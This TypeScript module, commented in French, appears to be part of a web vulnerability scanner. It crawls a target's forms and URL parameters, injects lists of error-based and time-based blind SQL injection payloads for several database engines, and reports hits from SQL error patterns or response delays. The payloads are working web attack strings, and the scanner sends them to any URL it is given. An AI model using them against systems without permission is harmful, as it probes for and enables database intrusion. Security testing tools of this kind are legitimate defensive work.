import axios from 'axios';
import * as cheerio from 'cheerio';
import { Vulnerability } from '../types';

// Payloads SQL injection basiques
const SQLI_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "admin' --",
  "admin' #",
  "' UNION SELECT NULL--",
  "1' AND '1'='1",
  "' AND 1=1--",
];

// ============================================
// NOUVEAUX PAYLOADS BLIND SQLI TIME-BASED
// ============================================
const BLIND_SQLI_PAYLOADS = [
  // MySQL
  "' AND SLEEP(5)--",
  "' OR SLEEP(5)--",
  "1' AND SLEEP(5)--",
  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  
  // PostgreSQL
  "'; SELECT pg_sleep(5)--",
  "' AND (SELECT 1 FROM pg_sleep(5))--",
  
  // SQL Server
  "'; WAITFOR DELAY '0:0:5'--",
  "' WAITFOR DELAY '0:0:5'--",
  "1'; WAITFOR DELAY '0:0:5'--",
  
  // Oracle
  "' AND DBMS_LOCK.SLEEP(5)--",
  
  // SQLite (pas de SLEEP natif, mais on teste quand même)
  "' AND (SELECT COUNT(*) FROM sqlite_master)>0 AND RANDOMBLOB(100000000)--",
];

// Patterns d'erreur SQL
const ERROR_PATTERNS = [
  /SQL syntax.*MySQL/i,
  /Warning.*mysql_/i,
  /valid MySQL result/i,
  /MySqlClient\./i,
  /PostgreSQL.*ERROR/i,
  /Warning.*pg_/i,
  /valid PostgreSQL result/i,
  /Npgsql\./i,
  /Driver.*SQL.*Server/i,
  /OLE DB.*SQL Server/i,
  /SQLServer JDBC Driver/i,
  /SqlException/i,
  /Oracle error/i,
  /Oracle.*Driver/i,
  /Warning.*oci_/i,
  /Warning.*ora_/i,
];

// Seuil de délai pour considérer une Blind SQLi (en millisecondes)
const TIME_THRESHOLD = 4500; // 4.5 secondes (pour un SLEEP de 5s)

/**
 * Scanne les vulnérabilités SQL Injection basiques ET Blind SQLi
 * Teste les inputs et paramètres URL
 */
export async function scanSQLi(target: string): Promise<Vulnerability[]> {
  const vulnerabilities: Vulnerability[] = [];

  try {
    // 1. Récupérer la page
    const response = await axios.get(target, {
      timeout: 10000,
      headers: { 'User-Agent': 'VulnScanner/1.0' },
    });

    const $ = cheerio.load(response.data);

    // 2. Trouver tous les formulaires
    const forms = $('form');

    for (let i = 0; i < forms.length; i++) {
      const form = $(forms[i]);
      const action = form.attr('action') || '';
      const method = (form.attr('method') || 'get').toLowerCase();

      // Récupérer tous les inputs
      const inputs = form.find('input, textarea').toArray();
      const inputNames = inputs
        .map(input => $(input).attr('name'))
        .filter((name): name is string => !!name);

      if (inputNames.length === 0) continue;

      // === TEST 1 : SQLi CLASSIQUE (Error-based) ===
      let foundClassicSQLi = false;
      for (const payload of SQLI_PAYLOADS) {
        const formUrl = new URL(action, target).href;
        const testResult = await testSQLiPayload(
          formUrl,
          method,
          inputNames,
          payload
        );

        if (testResult.vulnerable) {
          vulnerabilities.push({
            type: 'sqli',
            severity: 'critical',
            title: 'SQL Injection Vulnerability (Error-based)',
            description: `The application is vulnerable to SQL injection. The parameter "${testResult.parameter}" does not properly sanitize user input.`,
            location: formUrl,
            evidence: `Payload: ${payload}\nError: ${testResult.error}`,
          });
          foundClassicSQLi = true;
          break;
        }
      }

      // === TEST 2 : BLIND SQLI TIME-BASED ===
      if (!foundClassicSQLi) {
        const formUrl = new URL(action, target).href;
        
        // Mesurer le temps de réponse normal (baseline)
        const baselineTime = await measureResponseTime(formUrl, method, inputNames, 'test');
        
        // Tester les payloads time-based
        for (const payload of BLIND_SQLI_PAYLOADS) {
          const testTime = await measureResponseTime(formUrl, method, inputNames, payload);
          
          // Si le délai est significativement plus long, c'est une Blind SQLi
          if (testTime - baselineTime >= TIME_THRESHOLD) {
            vulnerabilities.push({
              type: 'sqli',
              severity: 'critical',
              title: 'Blind SQL Injection Vulnerability (Time-based)',
              description: `The application is vulnerable to Blind SQL injection. The parameter "${inputNames[0]}" is vulnerable to time-based attacks.`,
              location: formUrl,
              evidence: `Payload: ${payload}\nBaseline response time: ${baselineTime}ms\nDelay detected: ${testTime}ms (difference: ${testTime - baselineTime}ms)`,
            });
            break; // Une vulnérabilité par formulaire suffit
          }
        }
      }
    }

    // 3. Tester les paramètres URL (si présents)
    const url = new URL(target);
    const urlParams = Array.from(url.searchParams.keys());

    for (const param of urlParams) {
      // === TEST 1 : SQLi CLASSIQUE sur URL ===
      let foundClassicSQLiInUrl = false;
      for (const payload of SQLI_PAYLOADS) {
        const testUrl = new URL(target);
        testUrl.searchParams.set(param, payload);

        try {
          const testResponse = await axios.get(testUrl.href, {
            timeout: 5000,
            headers: { 'User-Agent': 'VulnScanner/1.0' },
          });

          const sqlError = detectSQLError(testResponse.data);
          if (sqlError) {
            vulnerabilities.push({
              type: 'sqli',
              severity: 'critical',
              title: 'SQL Injection in URL Parameter (Error-based)',
              description: `The URL parameter "${param}" is vulnerable to SQL injection.`,
              location: testUrl.href,
              evidence: `Payload: ${payload}\nError: ${sqlError}`,
            });
            foundClassicSQLiInUrl = true;
            break;
          }
        } catch (error) {
          // Ignorer les erreurs de requête
        }
      }

      // === TEST 2 : BLIND SQLI TIME-BASED sur URL ===
      if (!foundClassicSQLiInUrl) {
        // Mesurer le temps de baseline
        const baselineUrl = new URL(target);
        baselineUrl.searchParams.set(param, 'test');
        const baselineTime = await measureUrlResponseTime(baselineUrl.href);

        // Tester les payloads time-based
        for (const payload of BLIND_SQLI_PAYLOADS) {
          const testUrl = new URL(target);
          testUrl.searchParams.set(param, payload);
          const testTime = await measureUrlResponseTime(testUrl.href);

          if (testTime - baselineTime >= TIME_THRESHOLD) {
            vulnerabilities.push({
              type: 'sqli',
              severity: 'critical',
              title: 'Blind SQL Injection in URL Parameter (Time-based)',
              description: `The URL parameter "${param}" is vulnerable to Blind SQL injection using time-based techniques.`,
              location: target,
              evidence: `Payload: ${payload}\nBaseline: ${baselineTime}ms\nDelay detected: ${testTime}ms (difference: ${testTime - baselineTime}ms)`,
            });
            break;
          }
        }
      }
    }

  } catch (error) {
    console.error('Error scanning SQLi:', error);
  }

  return vulnerabilities;
}

/**
 * Teste un payload SQL injection sur un formulaire (error-based)
 */
async function testSQLiPayload(
  url: string,
  method: string,
  params: string[],
  payload: string
): Promise<{ vulnerable: boolean; parameter?: string; error?: string }> {
  try {
    const data: Record<string, string> = {};
    params.forEach(param => {
      data[param] = payload;
    });

    let response;
    if (method === 'post') {
      response = await axios.post(url, data, {
        timeout: 5000,
        headers: { 'User-Agent': 'VulnScanner/1.0' },
      });
    } else {
      response = await axios.get(url, {
        params: data,
        timeout: 5000,
        headers: { 'User-Agent': 'VulnScanner/1.0' },
      });
    }

    const sqlError = detectSQLError(response.data);
    if (sqlError) {
      return {
        vulnerable: true,
        parameter: params[0],
        error: sqlError,
      };
    }
  } catch (error) {
    // Ignorer les erreurs de requête
  }

  return { vulnerable: false };
}

/**
 * NOUVELLE FONCTION : Mesure le temps de réponse d'une requête sur un formulaire
 */
async function measureResponseTime(
  url: string,
  method: string,
  params: string[],
  payload: string
): Promise<number> {
  const startTime = Date.now();
  
  try {
    const data: Record<string, string> = {};
    params.forEach(param => {
      data[param] = payload;
    });

    if (method === 'post') {
      await axios.post(url, data, {
        timeout: 15000, // Timeout plus long pour les time-based
        headers: { 'User-Agent': 'VulnScanner/1.0' },
      });
    } else {
      await axios.get(url, {
        params: data,
        timeout: 15000,
        headers: { 'User-Agent': 'VulnScanner/1.0' },
      });
    }
  } catch (error) {
    // Même en cas d'erreur, on mesure le temps
  }

  return Date.now() - startTime;
}

/**
 * NOUVELLE FONCTION : Mesure le temps de réponse d'une URL
 */
async function measureUrlResponseTime(url: string): Promise<number> {
  const startTime = Date.now();
  
  try {
    await axios.get(url, {
      timeout: 15000,
      headers: { 'User-Agent': 'VulnScanner/1.0' },
    });
  } catch (error) {
    // Même en cas d'erreur, on mesure le temps
  }

  return Date.now() - startTime;
}

/**
 * Détecte les erreurs SQL dans une réponse
 */
function detectSQLError(html: string): string | null {
  for (const pattern of ERROR_PATTERNS) {
    const match = html.match(pattern);
    if (match) {
      return match[0];
    }
  }
  return null;
}
